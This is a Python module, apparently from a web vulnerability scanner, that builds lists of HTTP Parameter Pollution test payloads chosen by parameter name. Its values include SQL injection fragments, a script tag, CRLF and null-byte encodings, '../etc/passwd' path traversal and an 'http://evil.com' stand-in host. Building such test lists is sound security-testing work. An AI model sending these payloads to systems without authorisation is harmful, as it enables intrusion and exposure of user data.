"""
HTTP Parameter Pollution (HPP) payload collection
"""

from typing import List, Dict, Any

class HPPPayloads:
    """HTTP Parameter Pollution payload collection"""
    
    @staticmethod
    def get_basic_hpp_payloads() -> List[Dict[str, Any]]:
        """Get basic HPP test payloads"""
        return [
            {
                'name': 'numeric_pollution',
                'values': ['1', '2', '999'],
                'description': 'Test numeric parameter pollution'
            },
            {
                'name': 'string_pollution',
                'values': ['test', 'admin', 'user'],
                'description': 'Test string parameter pollution'
            },
            {
                'name': 'boolean_pollution',
                'values': ['true', 'false', '1', '0'],
                'description': 'Test boolean parameter pollution'
            },
            {
                'name': 'empty_pollution',
                'values': ['', 'null', 'undefined'],
                'description': 'Test empty value pollution'
            }
        ]
    
    @staticmethod
    def get_advanced_hpp_payloads() -> List[Dict[str, Any]]:
        """Get advanced HPP test payloads"""
        return [
            {
                'name': 'injection_pollution',
                'values': ["'", '"', '<script>', 'OR 1=1'],
                'description': 'Test injection via parameter pollution'
            },
            {
                'name': 'bypass_pollution',
                'values': ['admin', 'root', '0', '-1'],
                'description': 'Test authentication bypass via pollution'
            },
            {
                'name': 'overflow_pollution',
                'values': ['A' * 100, '9' * 50, 'x' * 200],
                'description': 'Test buffer overflow via pollution'
            },
            {
                'name': 'special_pollution',
                'values': ['%00', '%0a', '%0d%0a', '../'],
                'description': 'Test special character pollution'
            }
        ]
    
    @staticmethod
    def get_all_payloads() -> List[Dict[str, Any]]:
        """Get all HPP payloads"""
        return HPPPayloads.get_basic_hpp_payloads() + HPPPayloads.get_advanced_hpp_payloads()
    
    @staticmethod
    def get_context_specific_payloads(parameter_name: str) -> List[Dict[str, Any]]:
        """Get context-specific HPP payloads based on parameter name"""
        context_payloads = []
        param_lower = parameter_name.lower()
        
        # ID-based parameters
        if any(id_word in param_lower for id_word in ['id', 'user', 'account']):
            context_payloads.extend([
                {
                    'name': 'id_pollution',
                    'values': ['1', '0', '-1', '999999'],
                    'description': 'Test ID parameter pollution'
                }
            ])
        
        # Search parameters
        if any(search_word in param_lower for search_word in ['search', 'query', 'q']):
            context_payloads.extend([
                {
                    'name': 'search_pollution',
                    'values': ['test', '*', '%', 'OR 1=1'],
                    'description': 'Test search parameter pollution'
                }
            ])
        
        # Action parameters
        if any(action_word in param_lower for action_word in ['action', 'cmd', 'command']):
            context_payloads.extend([
                {
                    'name': 'action_pollution',
                    'values': ['view', 'edit', 'delete', 'admin'],
                    'description': 'Test action parameter pollution'
                }
            ])
        
        # File parameters
        if any(file_word in param_lower for file_word in ['file', 'path', 'url']):
            context_payloads.extend([
                {
                    'name': 'file_pollution',
                    'values': ['index.php', '../etc/passwd', 'http://evil.com'],
                    'description': 'Test file parameter pollution'
                }
            ])
        
        return context_payloads if context_payloads else HPPPayloads.get_basic_hpp_payloads()
